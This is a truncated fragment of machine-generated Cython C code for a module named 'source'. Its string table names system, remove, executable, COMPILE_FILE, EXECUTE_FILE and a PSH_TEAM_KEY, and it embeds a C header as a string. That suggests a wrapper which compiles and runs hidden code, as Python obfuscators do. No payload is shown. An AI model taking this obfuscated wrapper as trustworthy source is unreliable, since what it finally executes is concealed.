nargs, kwargs)\n#endif\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\n#ifndef Py_MEMBER_SIZE\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\n#endif\n#if CYTHON_FAST_PYCALL\n  static size_t __pyx_pyframe_localsplus_offset = 0;\n  #include \"frameobject.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\n#endif // CYTHON_FAST_PYCALL\n#endif\n\n/* PyObjectCall.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n/* PyObjectCallMethO.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\n#endif\n\n/* PyObjectCallOneArg.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);\n\n/* PyDictVersioning.proto */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GE""T_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n/* GetModuleGlobalName.proto */\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__pyx_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleG""lobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n/* GetItemInt.proto */\n#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\\\n    (is_list ? (PyErr_SetString(PyExc_IndexError, \"list index out of range\"), (PyObject*)NULL) :\\\n               __Pyx_GetItemInt_Generic(o, to_py_func(i))))\n#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, \"list index out of range\"), (PyObject*)NULL))\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\n#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, \"tuple index out of range\"), (PyObject*)NULL))\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,\n                                                     int is_list, int wraparound, int boundscheck);\n\n/* SliceObject.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(\n        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObje""ct** py_start, PyObject** py_stop, PyObject** py_slice,\n        int has_cstart, int has_cstop, int wraparound);\n\n/* PyObjectLookupSpecial.proto */\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {\n    PyObject *res;\n    PyTypeObject *tp = Py_TYPE(obj);\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(PyInstance_Check(obj)))\n        return __Pyx_PyObject_GetAttrStr(obj, attr_name);\n#endif\n    res = _PyType_Lookup(tp, attr_name);\n    if (likely(res)) {\n        descrgetfunc f = Py_TYPE(res)->tp_descr_get;\n        if (!f) {\n            Py_INCREF(res);\n        } else {\n            res = f(res, obj, (PyObject *)tp);\n        }\n    } else {\n        PyErr_SetObject(PyExc_AttributeError, attr_name);\n    }\n    return res;\n}\n#else\n#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)\n#endif\n\n/* PyObjectCallNoArg.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);\n#else\n#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)\n#endif\n\n/* GetTopmostException.proto */\n#if CYTHON_USE_EXC_INFO_STACK\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\n#endif\n\n/* PyThreadStateGet.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  PyErr_Occurred()\n#endif\n\n/* SaveResetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject"" **value, PyObject **tb);\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\n#else\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\n#endif\n\n/* GetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n/* PyErrFetchRestore.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value"", tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n/* CLineInTraceback.proto */\n#ifdef CYTHON_CLINE_IN_TRACEBACK\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#else\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#endif\n\n/* CodeObjectCache.proto */\ntypedef struct {\n    PyCodeObject* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n};\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\n\n/* AddTraceback.proto */\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n/* GCCDiagnostics.proto */\n#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n/* CIntToPy.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\n\n/* FastTypeChecks.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE ""int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\n#endif\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n\n/* CheckBinaryVersion.proto */\nstatic int __Pyx_check_binary_version(void);\n\n/* InitStrings.proto */\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t);\n\n\n/* Module declarations from 'source' */\n#define __Pyx_MODULE_NAME \"source\"\nextern int __pyx_module_is_main_source;\nint __pyx_module_is_main_source = 0;\n\n/* Implementation of 'source' */\nstatic PyObject *__pyx_builtin_exit;\nstatic PyObject *__pyx_builtin_open;\nstatic const char __pyx_k_f[] = \"f\";\nstatic const char __pyx_k_os[] = \"os\";\nstatic const char __pyx_k_RUN[] = \"RUN\";\nstatic const char __pyx_k_sys[] = \"sys\";\nstatic const char __pyx_k_exit[] = \"exit\";\nstatic const char __pyx_k_main[] = \"__main__\";\nstatic const char __pyx_k_name[] = \"__name__\";\nstatic const char __pyx_k_open[] = \"open\";\nstatic const char __pyx_k_path[] = \"path\";\nstatic const char __pyx_k_test[] = \"__test__\";\nstatic const char __pyx_k_enter[] = \"__enter__\";\nstatic const char __pyx_k_split[] = \"split\";\nstatic const char __pyx_k_write[] = \"write\";\nstatic const char __pyx_k_C_FILE[] = \"C_FILE\";\nstatic const char __pyx_k_PREFIX[] = \"PREFIX\";\nstatic const char __pyx_k_exit_2[] = \"__exit__\";\nstatic const char __pyx_k_import[] = \"__import__\";\nstatic const char __pyx_k_isfile[] = \"isfile\";\nstatic const char __pyx_k_prefix[] = \"prefix\";\nstatic const char __pyx_k_remove[] = \"remove\";\nstati""c const char __pyx_k_system[] = \"system\";\nstatic const char __pyx_k_dirname[] = \"dirname\";\nstatic const char __pyx_k_version[] = \"version\";\nstatic const char __pyx_k_C_SOURCE[] = \"C_SOURCE\";\nstatic const char __pyx_k_exist_ok[] = \"exist_ok\";\nstatic const char __pyx_k_makedirs[] = \"makedirs\";\nstatic const char __pyx_k_executable[] = \"executable\";\nstatic const char __pyx_k_COMPILE_FILE[] = \"COMPILE_FILE\";\nstatic const char __pyx_k_EXECUTE_FILE[] = \"EXECUTE_FILE\";\nstatic const char __pyx_k_PSH_TEAM_KEY[] = \"PSH_TEAM_KEY\";\nstatic const char __pyx_k_PYTHON_VERSION[] = \"PYTHON_VERSION\";\nstatic const char __pyx_k_EXPORT_PYTHONHOME[] = \"EXPORT_PYTHONHOME\";\nstatic const char __pyx_k_cline_in_traceback[] = \"cline_in_traceback\";\nstatic const char __pyx_k_EXPORT_PYTHON_EXECUTABLE[] = \"EXPORT_PYTHON_EXECUTABLE\";\nstatic const char __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define[] = \"#ifndef PY_SSIZE_T_CLEAN\\n#define PY_SSIZE_T_CLEAN\\n#endif /* PY_SSIZE_T_CLEAN */\\n#include \\\"Python.h\\\"\\n#ifndef Py_PYTHON_H\\n    #error Python headers needed to compile C extensions, please install development version of Python.\\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\\n    #error Cython requires Python 2.6+ or Python 3.3+.\\n#else\\n#define CYTHON_ABI \\\"0_29_33\\\"\\n#define CYTHON_HEX_VERSION 0x001D21F0\\n#define CYTHON_FUTURE_DIVISION 1\\n#include <stddef.h>\\n#ifndef offsetof\\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\\n#endif\\n#if !defined(WIN32) && !defined(MS_WINDOWS)\\n  #ifndef __stdcall\\n    #define __stdcall\\n  #endif\\n  #ifndef __cdecl\\n    #define __cdecl\\n  #endif\\n  #ifndef __fastcall\\n    #define __fastcall\\n  #endif\\n#endif\\n#ifndef DL_IMPORT\\n  #define DL_IMPORT(t) t\\n#endif\\n#ifndef DL_EXPORT\\n  #define DL_EXPORT(t) t\\n#endif\\n#define __PYX_COMMA ,\\n#ifndef HAVE_LONG_LONG\\n  #if PY_VERSION_HEX >= 0x02070000\\n    #define HAVE_LONG""_LONG\\n  #endif\\n#endif\\n#ifndef PY_LONG_LONG\\n  #define PY_LONG_LONG LONG_LONG\\n#endif\\n#ifndef Py_HUGE_VAL\\n  #define Py_HUGE_VAL HUGE_VAL\\n#endif\\n#ifdef PYPY_VERSION\\n  #define CYTHON_COMPILING_IN_PYPY 1\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #undef CYTHON_USE_TYPE_SLOTS\\n  #define CYTHON_USE_TYPE_SLOTS 0\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #if PY_VERSION_HEX < 0x03050000\\n    #undef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #undef CYTHON_USE_UNICODE_INTERNALS\\n  #define CYTHON_USE_UNICODE_INTERNALS 0\\n  #undef CYTHON_USE_UNICODE_WRITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE\"\"_PYLONG_INTERNALS 0\\n  #undef CYTHON_AVOID_BORROWED_REFS\\n  #define CYTHON_AVOID_BORROWED_REFS 1\\n  #undef CYTHON_ASSUME_SAFE_MACROS\\n  #define CYTHON_ASSUME_SAFE_MACROS 0\\n  #undef CYTHON_UNPACK_METHODS\\n  #define CYTHON_UNPACK_METHODS 0\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\n  #undef CYTHON_USE_TP_FINALIZE\\n  #define CYTHON_USE_TP_FINALIZE 0\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\n  #endif\\n#elif defined(PYSTON_VERSION)\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 1\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #ifndef CYTHON_US""E_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #undef CYTHON_USE_ASYNC_SLOTS\\n  #define CYTHON_USE_ASYNC_SLOTS 0\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #undef CYTHON_USE_UNICODE_WRITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\n  #undef CYTHON\"\"_USE_TP_FINALIZE\\n  #define CYTHON_USE_TP_FINALIZE 0\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\n  #endif\\n#elif defined(PY_NOGIL)\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 1\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #ifndef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #undef CYTHON_USE_UNICODE_W""RITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\\n  #endif\\n  #ifndef CYTHON_USE_TP_FINALIZE\\n    #define CYTHON_USE_TP_FINALIZE 1\\n  #endif\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n#else\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 1\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #e\"\"ndif\\n  #if PY_VERSION_HEX < 0x02070000\\n    #undef CYTHON_USE_PYTYPE_LOOKUP\\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\\n  #endif\\n  #if PY_MAJOR_VERSION < 3\\n    #undef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #if PY_VERSION_HEX < 0x02070000\\n    #undef CYTHON_USE_PYLONG_INTERNALS\\n    #define CYTHON_USE_PYLONG_INTERNALS 0\\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\\n    #define CYTHON_USE_PYLONG_INTERNALS 1\\n  #endif\\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\\n    #define CYTHON_USE_PYLIST_INTERNALS 1\\n  #endif\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSIO""N_HEX >= 0x030B00A2\\n    #undef CYTHON_USE_UNICODE_WRITER\\n    #define CYTHON_USE_UNICODE_WRITER 0\\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\\n    #define CYTHON_USE_UNICODE_WRITER 1\\n  #endif\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #if PY_VERSION_HEX >= 0x030B00A4\\n    #undef CYTHON_FAST_THREAD_STATE\\n    #define CYTHON_FAST_THREAD_STATE 0\\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\\n    #define CYTHON_FAST_THREAD_STATE 1\\n  #endif\\n  #ifndef CYTHON_FAST_PYCALL\\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\\n  #endif\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\\n  #endif\\n  #ifndef CYTHON_USE_TP_FINALIZE\\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\\n  #endif\\n  #ifndef CYTHON_USE_DICT_VERSIONS\\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\\n  #endif\\n  #if PY_VERSION_HEX >= 0x030B0\"\"0A4\\n    #undef CYTHON_USE_EXC_INFO_STACK\\n    #define CYTHON_USE_EXC_INFO_STACK 0\\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\\n  #endif\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\\n  #endif\\n#endif\\n#if !defined(CYTHON_FAST_PYCCALL)\\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\\n#endif\\n#if CYTHON_USE_PYLONG_INTERNALS\\n  #if PY_MAJOR_VERSION < 3\\n    #include \\\"longintrepr.h\\\"\\n  #endif\\n  #undef SHIFT\\n  #undef BASE\\n  #undef MASK\\n  #ifdef SIZEOF_VOID_P\\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\\n  #endif\\n#endif\\n#ifndef __has_attribute\\n  #define __has_attribute(x) 0\\n#endif\\n#ifndef ""__has_cpp_attribute\\n  #define __has_cpp_attribute(x) 0\\n#endif\\n#ifndef CYTHON_RESTRICT\\n  #if defined(__GNUC__)\\n    #define CYTHON_RESTRICT __restrict__\\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\\n    #define CYTHON_RESTRICT __restrict\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define CYTHON_RESTRICT restrict\\n  #else\\n    #define CYTHON_RESTRICT\\n  #endif\\n#endif\\n#ifndef CYTHON_UNUSED\\n# if 